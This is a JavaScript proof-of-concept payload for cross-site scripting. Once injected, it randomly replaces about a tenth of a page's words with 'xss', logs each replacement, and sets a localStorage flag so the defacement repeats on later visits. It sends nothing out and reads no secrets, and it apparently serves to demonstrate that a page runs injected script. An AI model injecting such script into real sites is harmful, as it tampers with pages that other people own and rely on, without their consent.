(function(){
    console.log('[XSS POC] Script loaded');
  
    // Function to walk DOM and collect text nodes
    function walk(node) {
      var child, next;
      switch (node.nodeType) {
        case 1:  // Element
        case 9:  // Document
        case 11: // Document fragment
          child = node.firstChild;
          while (child) {
            next = child.nextSibling;
            walk(child);
            child = next;
          }
          break;
        case 3: // Text node
          textNodes.push(node);
          break;
      }
    }
  
    // Function to replace ~10% of words with 'xss'
    function replaceWords() {
      console.log('[XSS POC] Starting word replacement');
      textNodes = [];
      walk(document.body);
      console.log('[XSS POC] Collected', textNodes.length, 'text nodes');
  
      var totalReplaced = 0;
      textNodes.forEach(function(node, idx) {
        var original = node.nodeValue;
        var parts = original.split(/(\b)/);
        var replacedInThisNode = 0;
  
        for (var i = 0; i < parts.length; i++) {
          if (/^\w+$/.test(parts[i]) && Math.random() < 0.10) {
            console.log(
              '[XSS POC] Replacing word:',
              parts[i],
              '-> xss (node', idx, 'word index', i, ')'
            );
            parts[i] = 'xss';
            totalReplaced++;
            replacedInThisNode++;
          }
        }
  
        if (replacedInThisNode > 0) {
          console.log(
            '[XSS POC] Node', idx, 'had',
            replacedInThisNode, 'replacements'
          );
        }
  
        node.nodeValue = parts.join('');
      });
  
      console.log('[XSS POC] Total words replaced:', totalReplaced);
    }
  
    // Check localStorage flag
    var injectedFlag = localStorage.getItem('xssInjected');
    console.log('[XSS POC] localStorage.xssInjected =', injectedFlag);
  
    if (injectedFlag === 'true') {
      console.log('[XSS POC] Flag is set, reapplying replacements');
      replaceWords();
    } else {
      console.log('[XSS POC] Flag not set, applying replacements and setting flag');
      replaceWords();
      localStorage.setItem('xssInjected', 'true');
      console.log('[XSS POC] localStorage.xssInjected now set to true');
    }
  })();
  